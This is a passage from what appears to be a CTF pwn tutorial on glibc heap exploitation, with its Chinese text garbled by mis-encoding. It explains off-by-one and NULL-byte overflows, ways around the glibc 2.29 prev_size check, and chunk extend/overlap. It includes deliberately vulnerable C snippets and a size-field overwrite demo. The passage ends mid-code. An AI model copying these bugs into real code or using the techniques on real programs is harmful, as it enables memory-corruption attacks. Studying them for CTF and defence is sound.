<span class="token number">0x0000000000000000</span><span class="token number">0x602020</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000020fe1</span><span class="token number">0x602030</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>16 å­—èŠ‚çš„ç©ºé—´æ˜¯å¦‚ä½•è£…å¾—ä¸‹ 24 ä¸ªå­—èŠ‚çš„å†…å®¹å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å€Ÿç”¨äº†ä¸‹ä¸€ä¸ªå—çš„ <code>pre_size</code> åŸŸ</p><p>ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¸ Glibc ä¸­å®é™…åˆ†é…çš„å†…å­˜å¤§å°ä¹‹é—´çš„è½¬æ¢å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* pad request bytes into a usable size -- internal version */</span><span class="token comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">request2size</span><span class="token expression"><span class="token punctuation">(</span>req<span class="token punctuation">)</span>                                                      </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                           </span><span class="token punctuation">\</span>         <span class="token expression"><span class="token operator">?</span> MINSIZE                                                             </span><span class="token punctuation">\</span>         <span class="token expression"><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>MALLOC_ALIGN_MASK<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>req = 24</code> æ—¶ï¼Œ<code>request2size(24) = 32</code></p><p>é™¤å» <code>chunk</code> å¤´éƒ¨çš„ 16 å­—èŠ‚ï¼Œå®é™…ä¸Šç”¨æˆ·å¯ç”¨ <code>chunk</code> ä¸º 16 å­—èŠ‚ï¼Œè€Œ <code>chunk</code> çš„ <code>pre_size</code> ä»…å½“å®ƒçš„å‰ä¸€å—å¤„äºé‡Šæ”¾çŠ¶æ€æ—¶æ‰èµ·ä½œç”¨ï¼Œæ‰€ä»¥ç”¨æˆ·è¿™æ—¶å€™å…¶å®è¿˜å¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª <code>chunk</code> çš„ <code>prev_size</code> å­—æ®µï¼Œæ­£å¥½ 24 ä¸ªå­—èŠ‚</p><blockquote><p>å®é™…ä¸Š <code>ptmalloc2</code> åˆ†é…å†…å­˜æ˜¯ä»¥åŒå­—ä¸ºåŸºæœ¬å•ä½</p><p>ä»¥ 64 ä½ç³»ç»Ÿä¸ºä¾‹ï¼Œåˆ†é…å‡ºæ¥çš„ç©ºé—´æ˜¯ 16 çš„æ•´æ•°å€ï¼Œå³ç”¨æˆ·ç”³è¯·çš„ <code>chunk</code> éƒ½æ˜¯ 16 å­—èŠ‚å¯¹é½çš„</p></blockquote><hr><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><blockquote><p>off-by-one æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå¹¶ä¸”<strong>åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚</strong>ï¼Œå±äºä¸€ç§ç‰¹æ®Šçš„æº¢å‡ºæ¼æ´</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/">å †ä¸­çš„ off-by-one - CTF Wiki</a></p></blockquote><p>off-by-one æœ€ç»ˆçš„æ•ˆæœæ˜¯å¯ä»¥å°†ä¸€ä¸ªé‡Šæ”¾çŠ¶æ€çš„ <code>small bin chunk</code> æˆ–æ˜¯ <code>unsorted bin chunk</code> ä¸€ç›´åˆ°è¢«æº¢å‡º <code>chunk</code> åˆå¹¶æˆä¸€ä¸ªå¤§çš„ <code>chunk</code></p><hr><h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p>è¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †å—ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯çš„æ¬¡æ•°è®¾ç½®é”™è¯¯ï¼ˆè¿™åœ¨ C è¯­è¨€åˆå­¦è€…ä¸­å¾ˆå¸¸è§ï¼‰å¯¼è‡´å¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚</li></ul><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">my_gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">my_gets</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äº for å¾ªç¯çš„è¾¹ç•Œæ²¡æœ‰æ§åˆ¶å¥½ï¼Œå¯¼è‡´å†™å…¥å¤šæ‰§è¡Œäº†ä¸€æ¬¡</p><p>æ‰§è¡Œ <code>my_gets()</code> ä¹‹å‰çš„å †ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A81.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨1.png"></p><p>å‡è®¾è¾“å…¥äº† 17 ä¸ªå­—èŠ‚ï¼š<code>aaaaaaaaaaaaaaaaa</code>ï¼Œæ­¤æ—¶çš„å †ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A82.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨2.png"></p><p>å¯ä»¥çœ‹åˆ°æ•°æ®å‘ç”Ÿäº†æº¢å‡ºï¼Œæœ‰ä¸€ä¸ª <code>&#39;a&#39;</code> è¦†ç›–åˆ°äº†ä¸‹ä¸€ä¸ªå †å—çš„ <code>prev_size</code> åŸŸ</p><ul><li>å­—ç¬¦ä¸²æ“ä½œä¸åˆé€‚</li></ul><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä¸è€ƒè™‘æ ˆæº¢å‡ºï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå¯èƒ½å¾ˆå¤šäººåœ¨å®é™…çš„ä»£ç ä¸­ä¹Ÿæ˜¯è¿™æ ·å†™çš„ï¼Œä½†æ˜¯ <strong><code>strlen</code> å’Œ <code>strcpy</code> çš„è¡Œä¸ºä¸ä¸€è‡´å´å¯¼è‡´äº† off-by-one çš„å‘ç”Ÿ</strong></p><p>åŸå› åœ¨äºï¼Œ<code>strlen</code> åœ¨è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦æ—¶ä¸åŒ…æ‹¬ç»“æŸç¬¦Â <code>&#39;\x00&#39;</code>ï¼Œè€Œ <code>strcpy</code> åœ¨å¤åˆ¶å­—ç¬¦ä¸²æ—¶ä¼šæ‹·è´ç»“æŸç¬¦Â <code>&#39;\x00&#39;</code>ï¼Œå› æ­¤ï¼Œæœ€åå…¶å®å‘ <code>chunk1</code> ä¸­å†™å…¥äº† 25 ä¸ªå­—èŠ‚</p><p>æ‰§è¡Œ <code>gets(buffer)</code> ä¹‹å‰çš„å †ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A83.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨3.png"></p><p>æ‰§è¡Œ <code>strcpy(chunk1, buffer)</code> ä¹‹åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A84.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨4.png"></p><p>å¯ä»¥çœ‹åˆ° <code>next chunk</code> çš„ <code>size</code> åŸŸä½å­—èŠ‚è¢«ç»“æŸç¬¦Â <code>&#39;\x00&#39;</code>Â è¦†ç›–ï¼ˆè¿™ç§æƒ…å†µåˆå±äº off-by-one çš„ä¸€ä¸ªåˆ†æ”¯ï¼šNULL byte off-by-oneï¼‰</p><ul><li>å½“ç„¶ï¼Œä¹Ÿä¸æ’é™¤å†™å…¥çš„ <code>size</code> æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µ</li></ul><blockquote><p>ä¸€èˆ¬æ¥è¯´ï¼Œå•å­—èŠ‚æº¢å‡ºè¢«è®¤ä¸ºæ˜¯éš¾ä»¥åˆ©ç”¨çš„</p><p>ä½†æ˜¯å› ä¸º Linux çš„å †ç®¡ç†æœºåˆ¶ <code>ptmalloc2</code> éªŒè¯çš„æ¾æ•£æ€§ï¼ŒåŸºäº Linux å †çš„ off-by-one æ¼æ´åˆ©ç”¨èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œå¹¶ä¸”å¨åŠ›å¼ºå¤§</p></blockquote><hr><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><ol><li>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚</li></ol><p>é€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²æˆ–è€…è¦†ç›–å…¶ä»–å—æ•°æ®</p><ol start="2"><li>æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚</li></ol><p>åœ¨ <code>size</code> ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾—Â <code>prev_in_use</code>Â ä½è¢«æ¸…é™¤ï¼ˆè®°å½•å‰ä¸€ä¸ª <code>chunk</code> å—æ˜¯å¦è¢«åˆ†é…ï¼‰ï¼Œè¿™æ ·å‰ä¸€ä¸ªå—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—</p><p>ç„¶åå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p><p>ï¼ˆ1ï¼‰ä½¿ç”¨ unlink æ–¹æ³•è¿›è¡Œå¤„ç†</p><p>ï¼ˆ2ï¼‰ç”±äºè¿™æ—¶Â <code>prev_size</code>Â åŸŸä¼šè¢«å¯ç”¨ï¼Œå¯ä»¥ä¼ªé€ Â <code>prev_size</code> é€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§Â <code>prev_size</code>Â æ‰¾åˆ°çš„å—çš„å¤§å°ä¸ <code>prev_size</code>Â æ˜¯å¦ä¸€è‡´</p><blockquote><p>æ³¨æ„ï¼š</p><p>åœ¨ Glibc 2.29 ä»¥åçš„ç‰ˆæœ¬ä»£ç ä¸­å·²ç»åŠ å…¥é’ˆå¯¹æ–¹æ³•ï¼ˆ2ï¼‰çš„ <code>check</code> ï¼Œå› æ­¤ä¼ ç»Ÿçš„æ–¹æ³•ï¼ˆ2ï¼‰å¤±æ•ˆï¼›ä½†æ˜¯åœ¨ Glibc 2.28 åŠä¹‹å‰ç‰ˆæœ¬å¹¶æ²¡æœ‰è¯¥ <code>check</code>ï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨</p></blockquote><p>Glibc ä¸­å¯¹äºæ­¤å¤„çš„ <code>check</code> å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* consolidate backward */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      prevsize <span class="token operator">=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>      size <span class="token operator">+=</span> prevsize<span class="token punctuation">;</span>      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* ä¸‹é¢ä¸¤è¡Œä»£ç åœ¨æ–°ç‰ˆæœ¬ Glibc ä¸­åŠ å…¥ï¼Œåˆ™æ–¹æ³•ï¼ˆ2ï¼‰æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ Glibc 2.28 åŠä¹‹å‰ç‰ˆæœ¬éƒ½æ²¡æœ‰é—®é¢˜      if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr ("corrupted size vs. prev_size while consolidating"); */</span>      <span class="token function">unlink_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Glibc 2.29 ä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œ <code>check</code> å¤„å¢åŠ äº†ä¸¤è¡Œä»£ç ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size while consolidating"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™è®©æˆ‘ä»¬æƒ³è¦æ§åˆ¶ä¸€ä¸ªçœŸå® <code>chunk</code> çš„ <code>size</code> å­—æ®µå˜å¾—æ›´åŠ å›°éš¾ï¼Œæ‰€ä»¥ä¼ ç»Ÿçš„ NULL byte off-by-one æ–¹æ³•å¤±æ•ˆ</p><p>ä½†æ˜¯ï¼Œåªéœ€è¦æ»¡è¶³è¢« unlink çš„ <code>chunk</code> å’Œä¸‹ä¸€ä¸ª <code>chunk</code> ç›¸è¿ï¼Œä»ç„¶å¯ä»¥ä¼ªé€  <code>fake_chunk</code></p><p>ä¼ªé€ çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ <code>large bin</code> é—ç•™çš„ <code>fd_nextsize</code> å’Œ <code>bk_nextsize</code> æŒ‡é’ˆï¼š</p><ul><li>ä»¥ <code>fd_nextsize</code> ä¸º <code>fake_chunk</code> çš„ <code>fd</code></li><li>ä»¥ <code>bk_nextsize</code> ä¸º <code>fake_chunk</code> çš„ <code>bk</code></li></ul><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶è¯¥ <code>fake_chunk</code> çš„ <code>size</code> å­—æ®µï¼ˆè¿™ä¸ªè¿‡ç¨‹ä¼šç ´ååŸ <code>large bin chunk</code> çš„ <code>fd</code> æŒ‡é’ˆï¼Œä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼‰ï¼ŒåŒæ—¶è¿˜å¯ä»¥é€šè¿‡éƒ¨åˆ†è¦†å†™ <code>fd_nextsize</code> æ§åˆ¶å…¶ <code>fd</code>ï¼Œç„¶ååœ¨åé¢ä½¿ç”¨å…¶ä»–çš„ <code>chunk</code> è¾…åŠ©ä¼ªé€ ï¼Œå¯ä»¥é€šè¿‡è¯¥ <code>check</code></p><p>ç„¶ååªéœ€è¦é€šè¿‡ unlink çš„æ£€æµ‹å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">(</span>fd <span class="token operator">-></span> bk <span class="token operator">==</span> p<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>bk <span class="token operator">-></span> fd <span class="token operator">==</span> p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å¦‚æœ <code>large bin</code> ä¸­ä»…æœ‰ä¸€ä¸ª <code>chunk</code>ï¼Œé‚£ä¹ˆè¯¥ <code>chunk</code> çš„ <code>fd_nextsize</code> æŒ‡é’ˆå’Œ <code>bk_nextsize</code> æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘è‡ªå·±</p></blockquote><ol><li><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ <code>fd_nextsize</code> æŒ‡å‘å †ä¸Šçš„ä»»æ„åœ°å€ï¼Œå¯ä»¥å®¹æ˜“åœ°ä½¿ä¹‹æŒ‡å‘ä¸€ä¸ª <code>fast bin + 0x10 - 0x18</code>ï¼Œè€Œ <code>fast bin</code> ä¸­çš„ <code>fd</code> ä¹Ÿä¼šæŒ‡å‘å †ä¸Šçš„ä¸€ä¸ªåœ°å€ï¼Œé€šè¿‡éƒ¨åˆ†è¦†å†™è¯¥æŒ‡é’ˆä¹Ÿå¯ä»¥ä½¿è¯¥æŒ‡é’ˆæŒ‡å‘ä¹‹å‰çš„ <code>large bin + 0x10</code>ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡Â <code>fd -&gt; bk == p</code>Â çš„æ£€æµ‹</p></li><li><p>ç”±äº <code>bk_nextsize</code> æˆ‘ä»¬æ— æ³•ä¿®æ”¹ï¼Œæ‰€ä»¥ <code>bk -&gt; fd</code> å¿…ç„¶åœ¨åŸå…ˆçš„ <code>large bin chunk</code> çš„ <code>fd</code> æŒ‡é’ˆå¤„ï¼ˆè¿™ä¸ª <code>fd</code> è¢«æˆ‘ä»¬ç ´åäº†ï¼‰ï¼Œé€šè¿‡ <code>fast bin</code> çš„é“¾è¡¨ç‰¹æ€§å¯ä»¥åšåˆ°ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆä¸”ä¸å½±å“å…¶ä»–çš„æ•°æ®ï¼Œå†å°†å…¶éƒ¨åˆ†è¦†å†™å°±å¯ä»¥é€šè¿‡Â <code>bk -&gt; fd == p</code>Â çš„æ£€æµ‹</p></li><li><p>ç„¶åé€šè¿‡ off-by-one å‘ä½åœ°å€åˆå¹¶ï¼Œå®ç° <code>chunk Overlap</code>ï¼Œä¹‹åå¯ä»¥æ³„éœ² libc çš„åŸºåœ°å€å’Œå †åœ°å€ï¼Œç„¶å <code>tcache</code> æ‰“ <code>__free_hook</code> å³å¯</p></li></ol><hr><h2 id="ç›¸å…³ä¾‹é¢˜"><a href="#ç›¸å…³ä¾‹é¢˜" class="headerlink" title="ç›¸å…³ä¾‹é¢˜"></a>ç›¸å…³ä¾‹é¢˜</h2><p>è§æœ¬ç«™ ã€Š<a href="%E3%80%90Asis%20CTF%202016%E3%80%91b00ks.md">ã€Asis CTF 2016ã€‘b00ks</a>ã€‹</p><hr><h1 id="Chunk-Extend-and-Overlap"><a href="#Chunk-Extend-and-Overlap" class="headerlink" title="Chunk Extend and Overlap"></a>Chunk Extend and Overlap</h1><blockquote><p><code>chunk extend</code>ï¼ˆå †æ‰©å±•ï¼‰æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ <code>extend</code> å¯ä»¥å®ç° <code>chunk Overlap</code>ï¼ˆå †é‡å ï¼‰çš„æ•ˆæœ</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">Chunk Extend and Overlapping - CTF Wiki</a></p></blockquote><p>è¿™ç§åˆ©ç”¨æ–¹æ³•é€šå¸¸éœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ <code>chunk header</code> ä¸­çš„æ•°æ®</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œ<code>Chunk Extend and Overlap</code> å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶ <code>chunk</code> ä¸­çš„å†…å®¹ï¼š</p><ul><li><p>å¦‚æœ <code>chunk</code> å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆç­‰ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æŒ‡é’ˆæ¥è¿›è¡Œä¿¡æ¯æ³„æ¼å’Œæ§åˆ¶æ‰§è¡Œæµç¨‹</p></li><li><p>æ­¤å¤–ï¼Œ<code>chunk extend</code> é€šè¿‡æ§åˆ¶ <code>size</code> å’Œ <code>pre_size</code> åŸŸå¯ä»¥å®ç° <code>chunk Overlap</code>ï¼Œé€šè¿‡ <code>Overlap</code> å¯ä»¥æ§åˆ¶ <code>chunk</code> çš„ <code>fd / bk</code> æŒ‡é’ˆä»è€Œå¯ä»¥å®ç° <code>fastbin attack</code> ç­‰åˆ©ç”¨</p></li></ul><hr><h2 id="å¯¹-inuse-çš„-fast-bin-è¿›è¡Œ-extend"><a href="#å¯¹-inuse-çš„-fast-bin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ inuse çš„ fast bin è¿›è¡Œ extend"></a>å¯¹ inuse çš„ fast bin è¿›è¡Œ extend</h2><blockquote><p>å½“æˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªå †å— <code>chunk1</code> å’Œ <code>chunk2</code> æ—¶ï¼Œé€šè¿‡ä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸï¼Œä½¿å…¶ <code>size</code> çš„å¤§å°åŒ…å« <code>chunk2</code>ï¼Œé‚£ä¹ˆ <code>free</code> æ‰ <code>chunk1</code> çš„æ—¶å€™ï¼Œ<code>chunk2</code> ä¹Ÿä¼šè¢« <code>free</code> æ‰</p><p>è€Œå½“æˆ‘ä»¬å†æ¬¡è¯·æ±‚è¿™ä¸¤ä¸ªå †å—å¤§å°ä¹‹å’Œçš„å †å—æ—¶ï¼Œå°±ä¼šè·å¾— <code>chunk1 + chunk2</code> çš„ç©ºé—´ï¼Œä¹Ÿå°±å¯ä»¥æ§åˆ¶ <code>chunk2</code> çš„å†…å®¹</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ä¸€ä¸ª 0x10 çš„ chunk</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>   <span class="token comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„ size åŸŸ</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token 